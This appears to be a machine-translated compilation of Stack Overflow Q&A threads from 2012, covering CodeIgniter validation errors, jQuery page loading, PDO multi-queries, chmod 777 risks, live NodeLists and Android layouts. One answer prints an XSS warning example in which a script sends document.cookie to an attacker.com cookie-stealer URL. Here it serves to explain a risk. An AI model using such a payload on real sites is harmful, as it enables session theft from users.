您的问题在其他地方-但不可能可靠地使用使用超过 2000 个字符的 URL，您将完全需要另一种方法-请参阅此 SO 答案：[URL 的最大长度是多少？](https://stackoverflow.com/a/417184/329769)

（也用于构建大字符串使用 a`StringBuilder`代替）

# php - 如何在 codeIgniter 中自定义表单验证错误

> ID：11271558
> 
> 赞同：7
> 
> 时间：2012-06-30T04:59:45.240
> 
> 标签：php, codeigniter

codeIgniter 中是否有我可以编辑的文件，以便我可以自定义表单验证消息？

![在此处输入图像描述](../Images/143bdbab124d0fd6c309d7597e0616b2.png)

我只想将它们放在项目符号列表中以消耗更少的空间。

这是我用来输出错误消息的代码：

```
<div class="alert <?php echo $alert['alert_type']; ?> min-form">
        <button type="button" class="close" data-dismiss="alert">x</button>
        <h4><?php echo $alert['main_message']; ?></h4> 
        <?php echo $alert['sub_message']; ?>
</div> 
```

基本上，`$alert['sub_message']`它只是`validation_errors()`从 CodeIgniter 的函数中获取数据，该函数从表单中输出验证错误。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-30T07:24:45.987

您可以通过以下方式更改**错误分隔符**：

```
<ul>
<?php echo validation_errors('<li>', '</li>'); ?>
</ul> 
```

文档：[https ://www.codeigniter.com/user_guide/libraries/form_validation.html#sharing-the-error-delimiters](https://www.codeigniter.com/user_guide/libraries/form_validation.html#changing-the-error-delimiters)

对于 v3：[https ://www.codeigniter.com/userguide3/libraries/form_validation.html#sharing-the-error-delimiters](https://www.codeigniter.com/userguide3/libraries/form_validation.html#changing-the-error-delimiters)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-06-30T23:10:30.190

您可以通过创建以添加额外的验证规则来扩展 form_validation 类以获得最大控制`application/libraries/MY_form_validation.php`- 我在下面附上了一个示例。

**直接编辑系统库是不好的做法**；CI 提供了更好的选择（通过*类、**[库](http://codeigniter.com/user_guide/general/creating_libraries.html)**、**[钩子](http://codeigniter.com/user_guide/general/hooks.html)**等**覆盖/自定义`MY_`*）。这为您提供了轻松升级 CI 版本的好处，并使您的应用程序可移植/自定义代码与核心框架隔离。

```
<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

/**
 * CodeIgniter Form Validation Extension
 */
class MY_Form_validation extends CI_Form_validation {

    /**
     *  MY_Form_validation::valid_url
     * @abstract Ensures a string is a valid URL
     */
    function valid_url($url) {
        if(preg_match("/^http(|s):\/{2}(.*)\.([a-z]){2,}(|\/)(.*)$/i", $url)) {
            if(filter_var($url, FILTER_VALIDATE_URL)) return TRUE;
        }
        $this->CI->form_validation->set_message('valid_url', 'The %s must be a valid URL.');
        return FALSE;
    }

    /**
     * MY_Form_validation::alpha_extra()
     * @abstract Alpha-numeric with periods, underscores, spaces and dashes
     */
    function alpha_extra($str) {
        $this->CI->form_validation->set_message('alpha_extra', 'The %s may only contain alpha-numeric characters, spaces, periods, underscores & dashes.');
        return ( ! preg_match("/^([\.\s-a-z0-9_-])+$/i", $str)) ? FALSE : TRUE;
    }

    /**
     * MY_Form_validation::numeric_comma()
     * @abstract Numeric and commas characters
     */
    function numeric_comma($str) {
        $this->CI->form_validation->set_message('numeric_comma', 'The %s may only contain numeric & comma characters.');
        return ( ! preg_match("/^(\d+,)*\d+$/", $str)) ? FALSE : TRUE;
    }

    /**
     * MY_Form_validation::matches_pattern()
     * @abstract Ensures a string matches a basic pattern
     */
    function matches_pattern($str, $pattern) {
        if (preg_match('/^' . $pattern . '$/', $str)) return TRUE;
        $this->CI->form_validation->set_message('matches_pattern', 'The %s field does not match the required pattern.');
        return FALSE;
    }   

}

/* End of file MY_form_validation.php */
/* Location: ./{APPLICATION}/libraries/MY_form_validation.php */ 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-01-04T15:26:53.587

您可以 `<?php echo form_error('field name', '<div class="error">', '</div>'); ?>` 用于单独显示错误。

[文档](http://ellislab.com/codeigniter/user-guide/libraries/form_validation.html#errordelimiters)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-05-28T16:24:18.900

您可以使用 CodeIgniter 的函数将分隔符从`<div>`更改为：`<li>``set_error_delimiters`

```
$this->form_validation->set_error_delimiters('<li>', '</li>'); 
```

您应该在加载表单验证类后立即执行此操作。

这将改变方式`validation_errors()` **并** `form_error('field_name')`显示出来。所以你需要添加`ul`或`ol`如下：

```
echo '<ul>' . validation_errors() . '</ul>'; 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-10-08T21:27:47.327

与上面的答案相同，只要您想使用引导程序：

```
<ul>
<?php echo validation_errors('<li><span class="label label-danger">', '</span></li>'); ?>
</ul> 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2018-05-21T14:04:01.230

**3 格式化/自定义错误显示的方法**

**1\. 全局更改分隔符：**要在控制器方法中全局更改错误分隔符，就在加载表单验证类之后。在 form_validation 库加载之后加载。您也可以在构造函数中加载。

```
$this->form_validation->set_error_delimiters('<div class="error">', '</div>'); 
```

**2.单独更改分隔符：**本教程中显示的两个错误生成函数中的每一个都可以提供自己的分隔符，如下所示

```
<?php echo form_error('field name', '<div class="error">', '</div>'); ?>
OR
<?php echo validation_errors('<div class="error">', '</div>'); ?> 
```

**3\. 在配置文件中设置分隔符：**您可以在 application/config/form_validation.php 中添加错误分隔符，如下所示。在文件中设置这 2 个配置变量。`$config['error_prefix'] ='<div class="error_prefix">';`和`$config['error_suffix'] = '</div>';`

参考链接：[https ://www.codeigniter.com/userguide3/libraries/form_validation.html#sharing-the-error-delimiters](https://www.codeigniter.com/userguide3/libraries/form_validation.html#changing-the-error-delimiters)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-06-30T23:16:46.410

看一眼`system/language/english/form_validation_lang.php`

我相信你可以编辑它，或者将它复制到`application/language/english/form_validation_lang.php`

* * *

## 回答 #8

> 赞同：-8
> 
> 时间：2012-10-22T06:49:06.217

为了使用 javascript 验证页面中的 devexpress 控件，请使用以下代码：

```
ASPxClientEdit.ValidateGroup(null); 
```

或者

```
ASPxClientEdit.ValidateGroup('validationgroup'); 
```

# android - 如何在不单击listView中的项目的情况下翻转屏幕

> ID：11271573
> 
> 赞同：0
> 
> 时间：2012-06-30T05:02:14.493
> 
> 标签：android, viewflipper

我的`ViewFlipper`. 其中一个视图包含 a`ListView`和`OnClickListener`。`ViewFlipper`空白视图工作正常。

但是，当我戴上`ListView`并尝试将当前视图翻转到下一个视图时，会单击列表视图上的项目，这是我在翻转过程中不想要的。

我可以使用任何功能来禁用子视图的中断吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T05:11:48.763

在此 SO 帖子中查看解决方案[ViewFlipper not flipping with child listview](https://stackoverflow.com/q/8924817/582571) & [Listview Swipe inside viewflipper](https://stackoverflow.com/q/2927084/582571)

# ios - 在 Facebook Chat 中识别 Chat 客户端应用

> ID：11271582
> 
> 赞同：0
> 
> 时间：2012-06-30T05:04:12.967
> 
> 标签：ios, facebook, xmpp, chat

我正在使用 XMPP 开发 iOS Facebook 聊天客户端应用程序（我正在使用 Robbie Hanson 的 XMPPFramework）。我的要求之一是我的应用程序想知道我名册中的在线用户是否使用相同的应用程序。（所以用例是在两个用户使用同一个 App 进行通信时提供一些额外的功能）。

我正在考虑将我的应用程序名称添加到 JID 的资源部分（例如 <...>@chat.facebook.com/myApp），以便我的应用程序可以通过检查在线用户的 JID 来使用它来识别自己。但是，当我查看收到的 JID 时，我找不到任何方法，它们只是 <...>@chat.facebook.com。

那么有谁知道是否可以为 Facebook Chat 设置资源，或者是否有其他方法可以实现我想要的？

非常感谢。

比利

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-02T03:57:13.667

为此使用资源不是一个好主意。有很多服务可以控制资源。同样，您会发现有一天您将编写另一个名称不同的客户端，并且只实现您期望从您的一个客户端提供的一些功能。

首先，多次阅读[XEP-0115 。](http://xmpp.org/extensions/xep-0115.html)大多数第一次阅读它的人都会感到困惑，所以请耐心等待它点击进入。

接下来，使用单独的 URI 描述客户端的每个单独功能。在您的功能哈希中使用这些功能 URI。如果您必须检查客户端的实际身份，请使用 caps 节点 URI 进行匹配。

# jquery - 一个html表单文件中的多个提交表单

> ID：11271583
> 
> 赞同：0
> 
> 时间：2012-06-30T05:04:18.487
> 
> 标签：jquery, mysql, forms

我想问一些简单且跨平台的代码/结构，我可以在这个表格中使用：我有一个包含 3 个部分的表格第 1 部分：输入课程信息第 2 部分：输入参与者信息第 3 部分：输入公司帐户信息

每个部分都有一个提交按钮，单击该按钮会将数据保存到 mysql 数据库用户可以为每个部分添加无限的数据集（第 3 部分除外）。这意味着我将为每个部分创建一个添加按钮，该按钮将在表格行中显示一组数据。单击时会添加另一行。当他们完成所需数量的数据集时。他们将单击提交按钮，然后这些数据集将保存在数据库中。

我不知道如何正确处理它。如果我为所有部分使用一个提交按钮，我想，我需要在 mysql 中创建一组表，这些表对应于我的 html 表单中的字段数。问题是，每个部分的数据集数将仅限于我的 sql 中的表数

# jquery - 在 div 中显示 html 文件

> ID：11271584
> 
> 赞同：3
> 
> 时间：2012-06-30T05:04:25.340
> 
> 标签：jquery, html, iframe, jquery-load

我一直在尝试寻找一种方法来做到这一点，因为我确信有数百个网站在解释它，但我就是不能正确地用词，所以我所有的搜索都会产生其他东西。

所以我很抱歉，如果这已经被问过很多次了。

无论如何，我想做的是在 div 中加载页面“page.html”。该页面只有文本，没有其他内容。因此，我不想使用 iframe，而是将此页面加载到 div 中，以便它只显示该页面上的文本。

我尝试了一些在搜索过程中发现的不同的东西，比如；

```
$(document).ready(function() {    
    $("div").load("page.html") 
}); 
```

但是由于某种原因，该方法更改了页面上的所有文本，而不是在该 div 中。（我在编码方面非常糟糕，所以我可能在该方法的某个地方出错了）

因此，任何人都可以建议一种在不使用 iframe 的情况下在 div 中加载页面内容的方法。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-30T05:07:35.980

`$('div')`将比您正在寻找的目标更多。如果您尝试将内容加载到特定`div`元素中，请给它一个 ID 并以这种方式定位它。

`<div id="pageContent"></div>`

```
$(document).ready(function() { 
    $('#pageContent').load('page.html');
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-30T05:27:04.550

```
$("#mydiv").load("myexternalfile.html"); 
```

试试这个链接

[http://api.jquery.com/load/](http://api.jquery.com/load/)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-30T05:21:39.693

简短的回答：你不能。

长答案：可以，但会很困难，容易出错，并且存在很大的安全风险。

假设这是您想要嵌入另一个页面的页面：

```
<!DOCTYPE html public>
<html>
 <head>
  <title>My Page</title>
 </head>
 <body>
  <div id="embedMe"></div>
 </body>
</html> 
```

然后，这是要嵌入第一个页面的代码：

```
<!DOCTYPE html public>
<html>
 <head>
  <title>My Embedded Page</title>
 </head>
 <body>
  <div id="content">
   Something interesting here...
  </div>
 </body>
</html> 
```

然后，当它被嵌入时：

```
<!DOCTYPE html public>
<html>
 <head>
  <title>My Page</title>
 </head>
 <body>
  <div id="embedMe">
   <!DOCTYPE html public>
   <html>
    <head>
     <title>My Embedded Page</title>
    </head>
    <body>
     <div id="content">
      Something interesting here...
     </div>
    </body>
   </html>
  </div>
 </body>
</html> 
```

你可以看到问题。你有两个`html`元素，两个`head`s，两个`body`s，两个`title`s，甚至两个`DOCTYPES`。这是一个仁慈的例子。假设攻击者可以将要嵌入的页面的 url 更改为包含以下内容的页面：

```
<script type="text/javascript">
 window.location.href = "http://www.attacker.com/cookiestealer.php?cookies=" + document.cookie;
</script> 
```

突然之间，你的用户抱怨他们的账户被黑了，责任就落在了你的持有人身上。这是一个简单的 XSS 示例，真正的攻击者可以更好地隐藏它。请只使用 iframe。这就是他们的目的。

# javascript - 构建一个简单的 Javascript 和 HTML 服务器

> ID：11271586
> 
> 赞同：2
> 
> 时间：2012-06-30T05:05:11.870
> 
> 标签：javascript, jquery, html, database, arduino

我正在尝试构建一个简单的服务器来与 Arduino 通信并存储从 Arduino 接收到的信息。我已经使用 Node.js 和 Node-serialport 建立了 Arduino 服务器连接，我当前的代码在[这里](https://gist.github.com/2945632)。

我希望能够将我在 javascript 中创建的对象存储到某种数据库中。我环顾四周，其中大多数似乎对我的需求很复杂，因为该服务器只会在本地运行。我见过 MongoDB，当然还有 MySQL，但我想使用更简单的东西，比如 JSON？任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T05:12:07.577

在使用 NodeJs 并需要 JSON 文档建模数据存储时，我喜欢 Apache CouchDB。它使用简单，访问速度快，并且对 Node.js 的模块有很好的支持。

# ios - 何时在 UITableView 单元格中释放 UIButton？

> ID：11271590
> 
> 赞同：0
> 
> 时间：2012-06-30T05:05:36.410
> 
> 标签：ios, uitableview, uibutton

我正在尝试在我的`cellForRowAtIndexPath`方法中向单元格添加一个按钮。那行得通，但我似乎每次更新单元格时都添加一个按钮（发现这个是因为我更新了错误的屏幕位置，并且我有 2 个既可以工作又可以单击的按钮）。

何时是分配和释放`UIButton`添加到单元格的正确时间？当然我不能在结束时释放按钮`cellForRowAtIndexPath`- 那会破坏按钮对象，不是吗？到目前为止，我发现的所有带有添加到单元格的按钮的片段似乎都在实例化新`UIButton`对象，`cellForRowAtIndexPath`其中让我有些困惑..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T05:34:44.757

通常，您尝试通过检索单元格`dequeueReusableCellWithIdentifier`，如果返回`nil`，则创建一个`UITableViewCell`. 只有在这种情况下，您才需要创建按钮。否则按钮已经存在。

就何时释放而言，您通常会 (a) 创建按钮；(b) 将其添加为单元格的子视图；(c) 如果是 ARC 代码，那么您将在那里释放按钮。因为它是作为子视图添加的，所以保留计数仍为 1，因此在单元格本身被释放之前不会被释放（你永远不必担心......iOS 会为你做到这一点）。

因此你`cellForRowAtIndexPath`会是这样的：

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    UIButton *button;
    if (cell == nil) 
    {
        cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier] autorelease];

        button = [[UIButton alloc] initWithFrame:buttonFrame];
        [button setTag:kButtonTag]; // if you need to do any reconfiguring of the button, it may be useful to set a tag
        // do additional button configuration
        [[cell contentView] addSubview:button];
        [button release]; // only needed if non-ARC
    }
    else
    {
        // if you need to reconfigure the button, you can grab it from the dequeued cell
        // obviously if you don't need to reconfigure it, you don't need to retrieve it again
        button = (UIButton*)[[cell contentView] viewWithTag:kButtonTag];
    }

    // complete the configuration of the cell

    return cell;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-02T13:37:13.947

有几件事：

1.  按钮出现在别处是因为您对不同类型的单元格使用相同的单元格标识符。每种类型的单元格都应该有自己的标识符。

2.  在按钮消失方面，我不知道为什么会发生这种情况`reloadRowsAtIndexPaths`，但是如果您将按钮移动到其他子视图的前面，您将不会丢失它。

3.  你可能想要`autorelease`你的 UITextField。（与 NSString 中的相同`titleForHeaderInSection`。）

无论如何，`cellForRowAtIndexPath`变成这样：

```
#define kTextFieldTag 100
#define kButtonFieldTag 101

//-----------------------------------------------------------------------------------------
// cellForRowAtIndexPath
//-----------------------------------------------------------------------------------------
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    NSString *cellIdentifier;
    UITableViewCell *cell;

    // Configure the cell...
    switch( [indexPath section] ) 
    {
        case WORKSHEET_SECTION_CLIENT: 
            cellIdentifier = @"CellClient";

            cell = [tableView dequeueReusableCellWithIdentifier:cellIdentifier];

            if (cell == nil) 
            {
                cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:cellIdentifier] autorelease];
            }

            cell.textLabel.text = clientName;
            cell.accessoryType = UITableViewCellAccessoryDisclosureIndicator;      
            break;

        case WORKSHEET_SECTION_PERIOD: 
        {
            UIButton *myButton1;

            cellIdentifier = @"CellPeriod";

            cell = [tableView dequeueReusableCellWithIdentifier:cellIdentifier];

            if (cell == nil) 
            {
                cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:cellIdentifier] autorelease];

                // Don't need UIButton alloc because method below does it for us..
                myButton1 = [UIButton buttonWithType:UIButtonTypeRoundedRect];
                myButton1.tag = kButtonFieldTag;

                CGRect cellFrame = [self.tableView rectForRowAtIndexPath:indexPath];

                int nButtonWidth  = 80;
                int nButtonHeight = 30;
                int nActualCellWidth = cellFrame.size.width - 40;
                int nButtonDeltaX = ( nActualCellWidth      - nButtonWidth  ) / 2;
                int nButtonDeltaY = ( cellFrame.size.height - nButtonHeight ) / 2;
                myButton1.frame = CGRectMake( nButtonDeltaX, nButtonDeltaY, nButtonWidth, nButtonHeight );      

                [myButton1 setTitle:@"OK" forState:UIControlStateNormal];

                // PDS: Add delaget for stopwatch clicking..
                [myButton1 addTarget:self action:@selector(buttonClickedStopWatch:) forControlEvents:UIControlEventTouchUpInside];  

                [cell.contentView addSubview:myButton1];      
            }
            else
            {
                myButton1 = (UIButton *)[[cell contentView] viewWithTag:kButtonFieldTag];
            }

            cell.textLabel.text = timeElapsed;
            cell.accessoryType = UITableViewCellAccessoryDisclosureIndicator;   
            [[cell contentView] bringSubviewToFront:myButton1];

            break;      
        }

        case 2:
            cellIdentifier = @"Cell2";

            cell = [tableView dequeueReusableCellWithIdentifier:cellIdentifier];

            if (cell == nil) 
            {
                cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:cellIdentifier] autorelease];
            }

            cell.accessoryType = UITableViewCellAccessoryDisclosureIndicator;
            cell.textLabel.text = @"Amount $130";
            break;      

        case 3:
        {
            cellIdentifier = @"Cell3";

            cell = [tableView dequeueReusableCellWithIdentifier:cellIdentifier];
            UITextField *myTextField;            

            if (cell == nil) 
            {
                cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:cellIdentifier] autorelease];

                myTextField = [[[UITextField alloc] initWithFrame:CGRectMake(20,10,125,25)] autorelease];
                [myTextField setTag:kTextFieldTag];
                myTextField.adjustsFontSizeToFitWidth = NO;
                myTextField.backgroundColor = [UIColor clearColor];
                myTextField.autocorrectionType = UITextAutocorrectionTypeNo;
                myTextField.autocapitalizationType = UITextAutocapitalizationTypeWords;
                myTextField.textAlignment   = UITextAlignmentLeft;
                myTextField.keyboardType    = UIKeyboardTypeDefault;
                myTextField.returnKeyType   = UIReturnKeyDone;
                myTextField.clearButtonMode = UITextFieldViewModeNever;
                //      myTextField.delegate = self;
                myTextField.font = [UIFont systemFontOfSize:14];

                [cell addSubview:myTextField];
            }
            else
            {
                myTextField = (UITextField *)[[cell contentView] viewWithTag:kTextFieldTag];
            }

            // note, theoretically, you could blow away anything that the user typed here
            [myTextField setPlaceholder:@"Type Data Here"];          

            cell.accessoryType = UITableViewCellAccessoryNone;

            cell.textLabel.font = [UIFont systemFontOfSize:14];
            cell.textLabel.numberOfLines = 0;
            break;

        }

        default:
            cellIdentifier = @"CellDummy";

            cell = [tableView dequeueReusableCellWithIdentifier:cellIdentifier];

            if (cell == nil) 
            {
                cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:cellIdentifier] autorelease];
            }

            cell.textLabel.text = @"Dummy";
            break;

    }

    return cell;
} 
```

就个人而言，我可能会将其拆分为单独的方法，但这取决于您。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T05:13:43.753

理想情况下，在添加之后`UIButton`您`UITableViewCell`可以释放它。因为在该按钮之后将出现在您的单元格中。

# php - PDO 多重查询

> ID：11271595
> 
> 赞同：13
> 
> 时间：2012-06-30T05:06:29.967
> 
> 标签：php, mysql, pdo

自 PHP 5.3 版`PDO_MYSQL`起，驱动程序已被替换为`PDO_MYSQLND`. 它引入了对多个查询的支持。

但是，如果通过了多个`SELECT`查询，我无法弄清楚如何获取两个结果集。两个查询都已执行，不可能是第二个刚刚被转储。

```
$db->query("SELECT 1; SELECT 2;")->fetchAll(PDO::FETCH_ASSOC); 
```

回报：

```
array(1) {
  [0]=>
  array(1) {
    [1]=>
    string(1) "1"
  }
} 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-06-30T05:27:46.250

事实证明，您需要使用`PDOStatement::nextRowset`.

```
$stmt   = $db->query("SELECT 1; SELECT 2;");
$stmt->nextRowset();
var_dump( $stmt->fetchAll(PDO::FETCH_ASSOC) ); 
```

这将返回第二个查询的结果。

这是一个有点奇怪的实现。如果多查询语句只返回一个数组下的两个结果集，那肯定会更容易。但是，优点是此实现允许使用不同的[FETCH 样式](http://www.php.net/manual/en/pdostatement.fetch.php)获取每个查询。

# security - 服务器如何使用 chmod 777 变得容易受到攻击？

> ID：11271596
> 
> 赞同：29
> 
> 时间：2012-06-30T05:06:44.567
> 
> 标签：security, chmod

我经常读一些文章说类似的东西

> chmod 777 不好！

我在想：

在文件上执行时如何变得容易受到攻击`chmod 777`？

我可以重现的真实世界示例是什么？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-06-30T05:14:53.333

它*允许任何人**查看和/或修改***文件系统内容：假设攻击者已经拥有通用系统访问权限，这在共享托管平台上很常见..有些从一开始就比其他人更“强化”。以下是可能的攻击媒介的一小部分*不完整*列表：

1.  ***“您的安全代码”可能会被在同一*Web 服务器上下文中运行的**“他们的恶意代码”覆盖**......可能会窃取密码/木马、暴露数据库、删除内容等。也就是说，*其他人的*代码可以在*您的安全下运行上下文*。**
***   **内容（例如“脚本源”）可能会在网络服务器**（或所有者）上下文之外查看。有连接数据库的“安全”密码吗？嗯，不再...*   如果内容受权限保护（例如，网络服务器以前无法访问），**网络服务器可能能够访问/列出敏感信息**……如果您不想共享它，那就不好了。不同的网络服务器配置也会以不同的方式处理“列表”，这也可能会暴露超出预期的内容。**

 **在上面我还假设“组”包括网络服务器主体，并且涉及网络服务器（和/或共享主机），可用作主要攻击向量和/或安全漏洞。但是，我再次强调这一点：*上面的列表并不完整*。

虽然不能“保证安全”，但使用最具体的权限可以减轻一些漏洞/暴露。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-08-19T16:20:17.300

如果攻击者只能访问 Web 界面（不能访问文件，例如，通过同一共享主机上的另一个帐户），则模式 777 不会*直接*打开任何漏洞。它的作用是让攻击者在以其他方式进入网站后更容易*更改*网站上的内容。

例如，假设您有一个 WordPress 站点，并且某个地方存在一个错误，允许攻击者在服务器守护程序的凭据下执行任意 PHP 代码（这在过去已经发生过很多次，并且毫无疑问将来会再次发生）。WordPress 本身的代码存储在`.php`服务器守护程序可以读取的文件中。如果这些文件是 777 模式，那么攻击者可以向它们写入 - 这意味着他们可以修改代码 - 更改您的站点的功能。也许他们安装了“利用漏洞驱动”工具包，现在访问您网站的每个人的浏览器都会被黑客入侵。也许他们安装了一个 SEO 垃圾邮件工具包，现在谷歌认为你在卖伟哥（但如果你直接访问该网站，它是不可见的——是的，这确实发生了）。

如果`.php`文件是模式 755，并且由不是服务器守护进程的用户拥有，那么攻击者就无法永久更改站点的功能。

请注意，这意味着 WordPress 的从管理面板自我升级功能是有风险的，因为它只有在 WordPress 可以修改自己的情况下才有效——你不能拥有它，而且对手一旦可以执行就无法修改文件任意 PHP。

*另请注意，如果服务器守护程序没有*文件和目录可以修改，*那么*在这方面您只有 100% 安全。即使只允许文件上传到单个目录仍然可能是一个问题——即使你让任何人放在那里的唯一东西是图像文件。（如果这似乎不可能，请查看http: [//lcamt​​uf.coredump.cx/squirrel/](http://lcamtuf.coredump.cx/squirrel/)。）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-30T05:17:52.317

命令中的每个数字`chmod`代表一个八进制（3 位）数字。三位数字，总共是 9 位。每个位代表一个权限；1 == 有权限，0 == 没有权限。

每个数字中的三位代表读取（二进制 100 == 十进制 4）、写入（二进制 010 == 十进制 2）和执行（二进制 001 == 十进制 1）。十进制 7 是读+写+执行权限。

命令的第一个数字`chmod`代表文件或目录所有者的权限。第二个是针对小组的。第三个是为了“宇宙”——也就是其他所有人。

因此，`chmod 777`代表您、组和每个人的读取、写入和执行权限。这通常比所需的访问权限大得多。

对于您的真实示例，想象一下如果一个名为的文件`my_bank_account_credentials`被更改为`chmod 777`. 不是很安全！恶意用户可以更改其中的内容，或者只是阅读它并愉快地拿走你的钱。

对于服务器来说，主要的危险是服务器代码中被利用的错误可能允许攻击者访问服务器进程有权访问的任何内容——这将包括任何具有`777`权限集的内容。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-02T12:19:23.070

chmod 是更改模式命令。777 表示权限。可以拥有权限的人分为三组（每个人都有自己的数字），依次为：所有者（文件或目录的前 7 个），组（与所有者属于同一组的每个人，第二个 7 ) 和世界 (第三个 7)。

所有者是文件的用户 - 那就是你。在 *nix 世界中，用户属于组。因此，您可能是组营销中的用户/所有者 Bob。这个模型让你可以做一些事情，比如说 Bob 可以读/写文件，其余的营销人员只能读取文件，而其他用户可以读取文件。

777 中的每个数字都是以下的二进制表示：rwx（读/写/执行）。所以 755 的 chmod 意味着： 111(7) - 所有者可以读写执行 101(5) - 组中的其他人可以执行或读取，不能写入 101(5) - 世界其他地方可以读取和执行，不能写入。

该设置意味着您可以读取/写入和执行文件，但访问您网站的人只能读取或执行文件。因此，您需要将 cgi-bin 中的程序设置为 755，以便人们可以将文件作为程序执行。

如果您将权限设置为“chmod 644”，您将获得一个可以由您写入但只能由世界其他地方读取的文件。这对于直接的 HTML 文件很有用，这样就不会出现手帕。但是尝试执行一个权限为 644 的文件，你会得到一个错误。

CHMOD 777 将允许每个人对您服务器的文件进行更改，它会给他们 WRITE 条件，每个人都知道这很糟糕。

* * *

## 回答 #5

> 赞同：-3
> 
> 时间：2016-05-12T01:32:28.620

如果恶意条目到达您的应用程序、网站等。无论它对代码做了什么。关键点在数据库上，没有可能的保护措施来防止“写入”它。所以 chmod 777 权限一点也不危险。**

# javascript - getElementsByTagName("*") 总是更新？

> ID：11271598
> 
> 赞同：6
> 
> 时间：2012-06-30T05:07:11.447
> 
> 标签：javascript, dom, getelementsbytagname

我做了这个代码：

```
var foo=document.createElement("div");

var childs=foo.getElementsByTagName("*");

console.log(childs.length);//0 OK

var a=document.createElement("a");

foo.appendChild(a);

console.log(childs.length);//1 WTF? 
```

小提琴：http: [//jsfiddle.net/RL54Z/3/](http://jsfiddle.net/RL54Z/3/)

我不必`childs=foo.getElementsByTagName("*");`在第五行和第六行之间写，以便`childs.length`更新。

怎么可能？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T05:12:11.567

如果您阅读[文档](https://developer.mozilla.org/en/DOM/element.getElementsByTagName)，您不会感到惊讶

> 返回具有给定标签名称的元素列表。搜索指定元素下的子树，不包括元素本身。返回的列表是实时的，这意味着它会自动使用 DOM 树进行自我更新。因此，无需使用相同的元素和参数多次调用 element.getElementsByTagName。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-30T05:18:57.463

DOM 中的大多数节点列表（例如从`getElementsBy*`、`querySelectorAll`和中返回`Node.childNodes`）不是简单的数组，而是`NodeList`对象。 `NodeList`对象通常是“实时的”，因为对文档的更改会自动传播到`Nodelist`对象。（一个例外是来自 的结果`querySelectorAll`，它*不是*实时的！）

因此，正如您在示例中看到的，如果您检索所有`a`元素的 NodeList，然后将另一个`a`元素添加到文档中，该元素`a`将出现在您的 NodeList 对象中。

这就是为什么在对文档进行更改的同时迭代 NodeList 是不安全的。例如，这段代码将以令人惊讶的方式表现：

```
var NodeListA = document.getElementsByTagName('a');

for (var i=0; i<NodeListA.length; ++i) {
   // UNSAFE: don't do this!
   NodeListA[i].parentNode.removeChild(NodeListA[i]);
} 
```

将会发生的是你最终会跳过元素！从 NodeList 的末尾向后迭代，或者将 NodeList 复制到普通数组（不会更新），然后使用它。

[在Mozilla MDC 站点上](https://developer.mozilla.org/En/DOM/NodeList)阅读有关 NodeList 的更多信息。

# android - 用 LinearLayout 子元素填充 RelativeLayout 父元素

> ID：11271601
> 
> 赞同：0
> 
> 时间：2012-06-30T05:09:10.303
> 
> 标签：android, android-layout

这看起来很简单，但我已经用尽了我的谷歌搜索耐心。

我有一个并排`RelativeLayout`有两个 sub的，我希望它们都垂直填充父级，无论两个 LinearLayout 的高度如何。`LinearLayout`这被用作`ListView`一行，**@id/item_left**下的内容通常比右边的内容短。

背景可绘制不会填满整行。

关于使双方都充满的任何想法？

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="fill_parent">
    <LinearLayout android:id="@+id/item_left"
        android:layout_width="wrap_content"
        android:layout_height="fill_parent"
        android:paddingRight="2dp"
        android:paddingLeft="2dp"
        android:background="@drawable/item_left"
        android:orientation="vertical">
        <TextView android:id="@+id/time"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:textColor="@color/item_left_text"
            android:text="" />
    </LinearLayout>

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:orientation="vertical"
        android:background="@color/item_right_background"
        android:layout_toRightOf="@id/item_left">           
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:textColor="@color/item_right_text"
            android:text="Row1" />

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:textColor="@color/item_right_text"
            android:text="Row2" />

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:textColor="@color/item_right_text"
            android:text="Row3" />
    </LinearLayout>
</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T05:32:16.647

